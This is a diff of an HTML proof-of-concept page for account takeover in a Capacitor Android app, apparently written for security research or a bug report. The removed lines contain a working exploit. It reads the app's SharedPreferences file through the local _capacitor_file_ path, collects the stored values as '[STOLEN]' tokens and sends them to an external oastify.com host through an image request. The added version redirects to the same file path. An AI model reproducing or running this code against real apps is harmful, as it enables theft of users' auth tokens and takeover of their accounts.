@@ -1,54 +1,12 @@
-<html><head><title>Qpon</title></head><body>
+<html><head><title>X</title></head><body>
 <pre id="log"></pre>
 <script>
 var L=document.getElementById("log");
 function log(s){L.textContent+=s+"\n"}
+log("=== Account Takeover PoC ===");
+log("");
 
-log("=== Qpon ATO PoC ===");
-log("Phase 1: Reading SharedPreferences via _capacitor_file_");
-
-var target = "https://localhost/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml";
-
-fetch(target)
-  .then(function(r) {
-    log("Status: " + r.status);
-    log("Content-Type: " + r.headers.get("content-type"));
-    return r.text();
-  })
-  .then(function(xml) {
-    log("\nPhase 2: SharedPreferences content:");
-    log(xml);
-
-    // Parse the XML to extract Authorize token
-    var parser = new DOMParser();
-    var doc = parser.parseFromString(xml, "text/xml");
-    var strings = doc.querySelectorAll("string");
-    var stolen = {};
-
-    for (var i = 0; i < strings.length; i++) {
-      var key = strings[i].getAttribute("name");
-      var val = strings[i].textContent;
-      stolen[key] = val;
-      log("\n[STOLEN] " + key + " = " + val.substring(0, 80) + (val.length > 80 ? "..." : ""));
-    }
-
-    // Exfiltrate
-    log("\nPhase 3: Exfiltrating...");
-    new Image().src = "https://e0fq16rugv703ei78jd5jrzw5nbez5nu.oastify.com/steal?d=" + encodeURIComponent(JSON.stringify(stolen));
-    log("DONE — tokens sent to attacker server");
-  })
-  .catch(function(e) {
-    log("fetch error: " + e.message);
-
-    // Fallback: try XHR
-    log("\nTrying XHR fallback...");
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", target, true);
-    xhr.onload = function() {
-      log("XHR status: " + xhr.status);
-      log("XHR response:\n" + xhr.responseText);
-    };
-    xhr.onerror = function() { log("XHR error") };
-    xhr.send();
-  });
+setTimeout(function(){
+  window.location.href = "https://localhost/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml";
+}, 1000);
 </script></body></html>
